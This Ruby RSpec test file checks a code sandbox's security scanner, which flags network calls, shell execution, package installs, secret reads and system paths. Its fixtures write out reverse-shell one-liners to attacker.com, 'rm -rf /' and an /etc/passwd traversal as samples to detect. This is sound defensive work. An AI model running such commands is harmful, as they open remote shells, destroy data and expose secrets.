# frozen_string_literal: true

require 'spec_helper'
require 'code_sandbox_mcp/security_monitor'

RSpec.describe CodeSandboxMcp::SecurityMonitor do
  describe '.scan_code' do
    context 'with safe code' do
      it 'returns no violations for simple print statement' do
        violations = described_class.scan_code('print("Hello, World!")', 'python')
        expect(violations).to be_empty
      end

      it 'returns no violations for basic mathematical operations' do
        violations = described_class.scan_code('result = 2 + 2', 'python')
        expect(violations).to be_empty
      end

      it 'returns no violations for local file operations' do
        violations = described_class.scan_code('with open("file.txt", "r") as f: content = f.read()', 'python')
        expect(violations).to be_empty
      end
    end

    context 'with network operations' do
      it 'detects urllib.request usage' do
        code = 'import urllib.request\nresponse = urllib.request.urlopen("http://example.com")'
        violations = described_class.scan_code(code, 'python')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('urllib.request')
        expect(violations.first[:line]).to eq(1)
      end

      it 'detects requests library usage' do
        code = 'import requests\nresponse = requests.get("http://example.com")'
        violations = described_class.scan_code(code, 'python')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('requests.')
      end

      it 'detects fetch in JavaScript' do
        code = 'fetch("https://api.example.com/data")'
        violations = described_class.scan_code(code, 'javascript')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('fetch(')
      end

      it 'detects curl usage' do
        code = 'curl https://example.com'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('curl ')
      end

      it 'detects wget usage' do
        code = 'wget https://example.com/file.zip'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('wget ')
      end

      it 'detects Ruby net/http usage' do
        code = 'require "net/http"\nNet::HTTP.get(URI("http://example.com"))'
        violations = described_class.scan_code(code, 'ruby')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('net/http')
      end
    end

    context 'with system operations' do
      it 'detects subprocess usage' do
        code = 'import subprocess\nsubprocess.run(["ls", "-la"])'
        violations = described_class.scan_code(code, 'python')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('subprocess.')
      end

      it 'detects system() calls' do
        code = 'system("rm -rf /")'
        violations = described_class.scan_code(code, 'ruby')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('system(')
      end

      it 'detects exec() calls' do
        code = 'exec("dangerous_command")'
        violations = described_class.scan_code(code, 'python')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('exec(')
      end

      it 'detects backtick execution' do
        code = 'result = `ls -la`'
        violations = described_class.scan_code(code, 'ruby')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('`ls -la`')
      end

      it 'detects popen usage' do
        code = 'popen("command")'
        violations = described_class.scan_code(code, 'ruby')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('popen')
      end
    end

    context 'with package manager operations' do
      it 'detects pip install' do
        code = 'pip install malicious-package'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('pip install')
      end

      it 'detects npm install' do
        code = 'npm install malicious-package'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('npm install')
      end

      it 'detects gem install' do
        code = 'gem install malicious-gem'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('gem install')
      end

      it 'detects yarn add' do
        code = 'yarn add malicious-package'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('yarn add')
      end
    end

    context 'with dangerous file operations' do
      it 'detects /proc/ access' do
        code = 'cat /proc/version'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('/proc/')
      end

      it 'detects /sys/ access' do
        code = 'ls /sys/class'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('/sys/')
      end

      it 'detects /dev/ access' do
        code = 'cat /dev/random'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('/dev/')
      end

      it 'detects directory traversal attempts' do
        code = 'cat ../../etc/passwd'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('../')
      end
    end

    context 'with reverse shell attempts' do
      it 'detects /dev/tcp usage' do
        code = 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        tcp_violation = violations.find { |v| v[:match].include?('/dev/tcp') || v[:match] == '/dev/' }
        expect(tcp_violation).not_to be_nil
      end

      it 'detects netcat usage' do
        code = 'nc -e /bin/sh attacker.com 4444'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('nc ')
      end

      it 'detects telnet usage' do
        code = 'telnet attacker.com 4444'
        violations = described_class.scan_code(code, 'bash')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('telnet')
      end
    end

    context 'with environment access' do
      it 'detects ENV access in Ruby' do
        code = 'secret = ENV["SECRET_KEY"]'
        violations = described_class.scan_code(code, 'ruby')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('ENV[')
      end

      it 'detects process.env access in JavaScript' do
        code = 'const secret = process.env.SECRET_KEY'
        violations = described_class.scan_code(code, 'javascript')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('process.env')
      end

      it 'detects os.environ access in Python' do
        code = 'import os\nsecret = os.environ["SECRET_KEY"]'
        violations = described_class.scan_code(code, 'python')

        expect(violations).not_to be_empty
        expect(violations.first[:match]).to eq('os.environ')
      end
    end

    context 'with multiple violations' do
      it 'detects multiple dangerous patterns in the same code' do
        code = <<~CODE
          import requests
          import subprocess
          response = requests.get("http://evil.com")
          subprocess.run(["rm", "-rf", "/"])
        CODE

        violations = described_class.scan_code(code, 'python')

        expect(violations.length).to eq(2)
        expect(violations.map { |v| v[:match] }).to include('requests.', 'subprocess.')
      end

      it 'reports correct line numbers for violations' do
        code = <<~CODE
          print("Starting script")
          requests.get("http://example.com")
          print("Middle of script")
        CODE

        violations = described_class.scan_code(code, 'python')

        expect(violations.length).to be >= 1
        requests_violation = violations.find { |v| v[:match].include?('requests') }
        expect(requests_violation).not_to be_nil
        expect(requests_violation[:line]).to eq(2)
      end
    end
  end

  describe '.check_resource_usage' do
    it 'returns empty array when resource usage is within limits' do
      allow(described_class).to receive(:`).with('netstat -an 2>/dev/null | grep ESTABLISHED | wc -l').and_return('2')
      allow(described_class).to receive(:`).with(/ps -o rss= -p \d+/).and_return('51200')

      violations = described_class.check_resource_usage
      expect(violations).to be_empty
    end

    it 'detects excessive network connections' do
      allow(described_class).to receive(:`).with('netstat -an 2>/dev/null | grep ESTABLISHED | wc -l').and_return('10')
      allow(described_class).to receive(:`).with(/ps -o rss= -p \d+/).and_return('51200')

      violations = described_class.check_resource_usage

      expect(violations.length).to eq(1)
      expect(violations.first.violation_type).to eq(:excessive_network_connections)
      expect(violations.first.details).to include('10 connections')
    end

    it 'detects excessive memory usage' do
      allow(described_class).to receive(:`).with('netstat -an 2>/dev/null | grep ESTABLISHED | wc -l').and_return('2')
      allow(described_class).to receive(:`).with(/ps -o rss= -p \d+/).and_return('307200')

      violations = described_class.check_resource_usage

      expect(violations.length).to eq(1)
      expect(violations.first.violation_type).to eq(:excessive_memory_usage)
      expect(violations.first.details).to include('300MB used')
    end

    it 'handles errors gracefully when commands are not available' do
      allow(described_class).to receive(:`).and_raise(StandardError, 'Command not found')

      violations = described_class.check_resource_usage
      expect(violations).to be_empty
    end
  end

  describe '.validate_network_enabled_execution' do
    it 'allows safe code' do
      result = described_class.validate_network_enabled_execution('print("Hello")', 'python')

      expect(result[:allowed]).to be true
      expect(result[:violations]).to be_empty
      expect(result[:recommendation]).to eq('Code appears safe for network execution')
    end

    it 'disallows dangerous code' do
      result = described_class.validate_network_enabled_execution('import requests\nrequests.get("http://evil.com")', 'python')

      expect(result[:allowed]).to be false
      expect(result[:violations]).not_to be_empty
      expect(result[:recommendation]).to eq('Consider using --network none for security')
    end
  end

  describe '::SecurityViolation' do
    it 'creates a security violation with type and details' do
      violation = described_class::SecurityViolation.new(:test_violation, 'test details')

      expect(violation.violation_type).to eq(:test_violation)
      expect(violation.details).to eq('test details')
      expect(violation.message).to eq('Security violation: test_violation - test details')
    end

    it 'creates a security violation with just type' do
      violation = described_class::SecurityViolation.new(:test_violation)

      expect(violation.violation_type).to eq(:test_violation)
      expect(violation.details).to be_nil
      expect(violation.message).to eq('Security violation: test_violation - ')
    end
  end

  describe 'constants' do
    it 'defines dangerous patterns' do
      expect(described_class::DANGEROUS_PATTERNS).to be_an(Array)
      expect(described_class::DANGEROUS_PATTERNS).to be_frozen
      expect(described_class::DANGEROUS_PATTERNS.length).to be > 0
    end

    it 'defines resource limits' do
      expect(described_class::RESOURCE_LIMITS).to be_a(Hash)
      expect(described_class::RESOURCE_LIMITS).to be_frozen
      expect(described_class::RESOURCE_LIMITS).to include(
        :max_network_connections,
        :max_memory_mb,
        :max_execution_time,
        :max_file_descriptors
      )
    end
  end

  describe '.find_line_number' do
    it 'finds correct line number for character offset' do
      code = "line 1\nline 2\nline 3"
      char_offset = code.index('line 3')

      line_number = described_class.send(:find_line_number, code, char_offset)
      expect(line_number).to eq(3)
    end

    it 'returns 1 for offset 0' do
      line_number = described_class.send(:find_line_number, 'test code', 0)
      expect(line_number).to eq(1)
    end
  end
end
